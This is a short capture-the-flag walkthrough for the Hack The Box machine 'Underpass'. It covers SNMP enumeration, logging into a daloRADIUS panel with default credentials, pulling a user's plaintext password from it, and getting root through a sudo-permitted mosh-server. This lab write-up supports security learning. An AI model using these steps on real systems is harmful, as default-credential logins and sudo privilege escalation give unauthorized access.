## Underpass.HTB

- ports open 
TCP: 22, 80
UDP: 161

- Port 161 (SNMP)
    - onesixtyone to crack the community strings
    - snmpwalk -v2c -c public 10.10.11.48

    ```
    snmpwalk -v2c -c public 10.10.11.48
    iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
    iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
    iso.3.6.1.2.1.1.3.0 = Timeticks: (1104039) 3:04:00.39
    iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"         IMP
    iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"                                       IMP
    iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
    iso.3.6.1.2.1.1.7.0 = INTEGER: 72
    iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03
    iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
    iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
    iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
    iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
    iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
    iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
    iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
    iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
    iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
    iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
    iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
    iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
    iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
    iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
    iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
    iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
    iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
    iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
    iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
    iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
    iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
    iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
    iso.3.6.1.2.1.25.1.1.0 = Timeticks: (1105446) 3:04:14.46
    iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 19 0B 1F 20 00 2B 00 00 
    iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
    iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
    iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
    iso.3.6.1.2.1.25.1.6.0 = Gauge32: 218
    iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
    iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
    ```

- Researching daloradius
https://kb.ct-group.com/radius-holding-post-watch-this-space/
https://github.com/lirantal/daloradius/tree/master

- Try to access http://underpass.htb/daloradius/app/operators/login.php

- Use default creds: `administrator:radius`

- `List Users` -> `svcMosh:underwaterfriends`

- ssh with steve using svcMosh password - does not work

- `ssh svcMosh@10.10.11.48` - Get the USER flag

- `sudo -l` says that we are allowed to run the `mosh-server` as root without password

- https://mosh.org/#usage - Mosh is a UDP repalcement of ssh
- ![how to use mosh](image.png)

- ssh in 2 windows using svcMosh

- In Window 1: run the mosh user as root - `sudo /usr/bin/mosh-server` 

- In Windows 2: use the Mosh-server key and port
    `MOSH_KEY=<key from prev command> /usr/bin/mosh-client 10.10.11.48 <60001>`

- Grab the root flag.
